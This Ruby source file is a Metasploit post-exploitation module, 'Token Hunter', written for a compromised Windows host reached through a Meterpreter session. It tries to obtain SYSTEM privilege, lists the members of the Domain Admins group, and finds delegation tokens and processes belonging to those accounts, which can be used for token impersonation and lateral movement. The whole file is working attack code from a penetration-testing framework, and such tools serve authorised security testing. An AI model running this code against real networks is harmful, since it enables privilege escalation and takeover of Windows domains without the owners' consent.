##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Enumerate Domain Admin Tokens (Token Hunter)',
        'Description' => %q{
          This module enumerates Domain Admin account processes and delegation tokens.

          This module will first check if the session has sufficient privileges
          to replace process level tokens and adjust process quotas.

          The SeAssignPrimaryTokenPrivilege privilege will not be assigned if
          the session has been elevated to SYSTEM. In that case try first
          migrating to another process that is running as SYSTEM.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'Author' => ['Joshua Abraham <jabra[at]rapid7.com>'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              incognito_list_tokens
              priv_elevate_getsystem
              stdapi_registry_open_key
              stdapi_sys_config_getprivs
              stdapi_sys_config_getuid
              stdapi_sys_config_sysinfo
              stdapi_sys_process_get_processes
            ]
          }
        }
      )
    )
    register_options([
      OptBool.new('GETSYSTEM', [ true, 'Attempt to get SYSTEM privilege on the target host.', true])
    ])
  end

  def get_system
    print_status('Trying to get SYSTEM privilege')

    results = session.priv.getsystem
    if results[0]
      print_status('Got SYSTEM privilege')
      return
    end

    print_error('Could not obtain SYSTEM privilege')
  rescue Rex::Post::Meterpreter::RequestError => e
    print_error("Could not obtain SYSTEM privilege: #{e}")
  end

  def priv_check
    if is_system?
      privs = session.sys.config.getprivs
      return privs.include?('SeAssignPrimaryTokenPrivilege') && privs.include?('SeIncreaseQuotaPrivilege')
    end

    is_admin?
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    fail_with(Failure::Unknown, "Failed to load incognito on #{session.sid} / #{session.session_host}") unless session.incognito

    get_system if datastore['GETSYSTEM'] && !is_system?

    fail_with(Failure::NoAccess, 'Aborted! Insufficient privileges.') unless priv_check

    domain = get_domain_name

    fail_with(Failure::Unknown, 'Could not retrieve domain name. Is the host part of a domain?') unless domain

    netbios_domain_name = domain.split('.').first.upcase

    domain_admins = get_members_from_group('Domain Admins', domain) || []

    fail_with(Failure::Unknown, "Could not retrieve '#{domain}\\Domain Admins' group members.") if domain_admins.blank?

    processes = client.sys.process.processes

    fail_with(Failure::Unknown, 'Could not retrieve system processes.') if processes.blank?

    user_tokens = session.incognito.incognito_list_tokens(0)
    user_delegation = user_tokens['delegation'].split("\n")

    domain_admins.each do |da_user|
      tbl_pids = Rex::Text::Table.new(
        'Header' => "#{da_user} Domain Admin Token PIDs",
        'Indent' => 1,
        'Columns' => ['Session', 'Host', 'User', 'PID']
      )

      user_delegation.each do |dt|
        next unless dt.include?(netbios_domain_name)

        ndom, nusr = dt.split('\\')

        next unless ndom == netbios_domain_name && da_user == nusr

        print_good("Found token for session #{session.sid} (#{session.session_host}) - #{da_user} (Delegation Token)")
      end

      processes.each do |p|
        next unless p['user'] == "#{netbios_domain_name}\\#{da_user}"

        pid = p['pid']
        tbl_pids << [session.sid, peer, da_user, pid]
        print_good("Found process on session #{session.sid} (#{session.session_host}) - #{da_user} (PID: #{pid}) (#{p['name']})")
      end

      if tbl_pids.rows.empty?
        print_status("Found no processes on session #{session.sid} (#{session.session_host}) - #{da_user}")
        next
      end

      next unless session.framework.db.active

      report_note(
        host: session.session_host,
        type: 'pid',
        data: tbl_pids.to_csv
      )
    end
  end
end
